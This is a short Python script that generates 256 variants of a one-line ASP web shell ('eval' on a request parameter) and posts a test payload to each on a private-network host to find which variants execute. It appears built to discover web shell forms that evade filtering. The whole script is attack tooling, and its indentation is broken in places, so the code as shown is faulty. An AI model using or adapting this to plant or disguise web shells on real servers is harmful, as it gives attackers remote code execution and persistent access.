#!/usr/bin/env python 
# coding:utf-8
import os
def generate(count): 
	template = """
<%
a = request("value") eval{0}a %>""".format(chr(count))
with open(os.path.join(path, "fuzz_{}.asp".format(count)), 'w') as f: f.write(template)
path = r"./fuzz/"
for c in range(0, 256): 
	generate(c)

import requests
  
for i in range(32,128):
	url = 'http://10.100.18.28/1/fuzz_{0}.asp'.format(i) 
	body_post = {'value': 'value=response.write("attack")'} 
	r = requests.post(url, data=body_post)
	content = r.text
	if 'attack' in content:
	print (url) 
	print (content)